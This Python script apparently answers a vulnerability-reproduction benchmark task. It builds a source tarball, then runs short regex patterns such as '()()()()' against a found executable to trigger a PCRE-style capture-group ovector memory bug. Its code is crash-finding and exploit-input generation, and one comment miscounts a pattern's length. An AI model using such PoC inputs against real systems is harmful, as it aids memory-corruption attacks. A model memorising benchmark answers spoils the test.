import os
import tarfile
import tempfile
import subprocess
import random
import string
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the extracted directory
            extracted_dir = None
            for item in os.listdir(tmpdir):
                item_path = os.path.join(tmpdir, item)
                if os.path.isdir(item_path):
                    extracted_dir = item_path
                    break
            
            if extracted_dir is None:
                # Fallback to minimal PoC based on vulnerability description
                return b"()" * 4  # 8 bytes with 4 capture groups
            
            # Try to compile the source code
            compile_success = False
            makefile_path = os.path.join(extracted_dir, "Makefile")
            
            if os.path.exists(makefile_path):
                # Try to compile with current Makefile
                try:
                    result = subprocess.run(
                        ["make", "-C", extracted_dir, "clean"],
                        capture_output=True,
                        timeout=30
                    )
                    result = subprocess.run(
                        ["make", "-C", extracted_dir],
                        capture_output=True,
                        timeout=60
                    )
                    compile_success = result.returncode == 0
                except:
                    compile_success = False
            
            if not compile_success:
                # Try alternative build methods
                configure_path = os.path.join(extracted_dir, "configure")
                if os.path.exists(configure_path):
                    try:
                        subprocess.run(
                            ["./configure"],
                            cwd=extracted_dir,
                            capture_output=True,
                            timeout=30
                        )
                        subprocess.run(
                            ["make", "clean"],
                            cwd=extracted_dir,
                            capture_output=True,
                            timeout=30
                        )
                        result = subprocess.run(
                            ["make"],
                            cwd=extracted_dir,
                            capture_output=True,
                            timeout=60
                        )
                        compile_success = result.returncode == 0
                    except:
                        compile_success = False
            
            # Test patterns based on vulnerability description
            test_patterns = [
                # 8-byte patterns with capture groups
                b"()" * 4,            # 4 capture groups
                b"(a)(b)",            # 2 capture groups, 8 bytes with nulls
                b"((()))",            # 3 capture groups
                b"(.)(.)(.)",         # 3 capture groups
                b"((((()))))"[:8],    # Truncated pattern
            ]
            
            # If compilation succeeded, test patterns
            if compile_success:
                # Look for test executable
                test_executable = None
                for root, dirs, files in os.walk(extracted_dir):
                    for file in files:
                        if file.endswith(".exe") or (os.access(os.path.join(root, file), os.X_OK) and not file.endswith(".so")):
                            # Check if it's a regex/test program
                            filepath = os.path.join(root, file)
                            try:
                                # Test if it accepts regex input
                                result = subprocess.run(
                                    [filepath, "--version"],
                                    capture_output=True,
                                    timeout=5
                                )
                                if b"regex" in result.stdout.lower() or b"pcre" in result.stdout.lower():
                                    test_executable = filepath
                                    break
                                # Try simple test
                                result = subprocess.run(
                                    [filepath, "test"],
                                    input=b"test",
                                    capture_output=True,
                                    timeout=5
                                )
                                test_executable = filepath
                                break
                            except:
                                continue
                    if test_executable:
                        break
                
                if test_executable:
                    # Test patterns
                    for pattern in test_patterns:
                        try:
                            # Run with pattern as input
                            proc = subprocess.run(
                                [test_executable],
                                input=pattern,
                                capture_output=True,
                                timeout=5
                            )
                            # Check for crash (non-zero exit code)
                            if proc.returncode != 0:
                                # Try to verify it's a memory error
                                if b"overflow" in proc.stderr.lower() or b"invalid" in proc.stderr.lower():
                                    return pattern
                        except subprocess.TimeoutExpired:
                            continue
                        except:
                            continue
            
            # Fallback to most likely pattern based on vulnerability description
            # The vulnerability mentions "fewer capturing parentheses than the available space in the external ovector"
            # This suggests we need capture groups but fewer than expected
            return b"()" * 4  # 8 bytes with 4 capture groups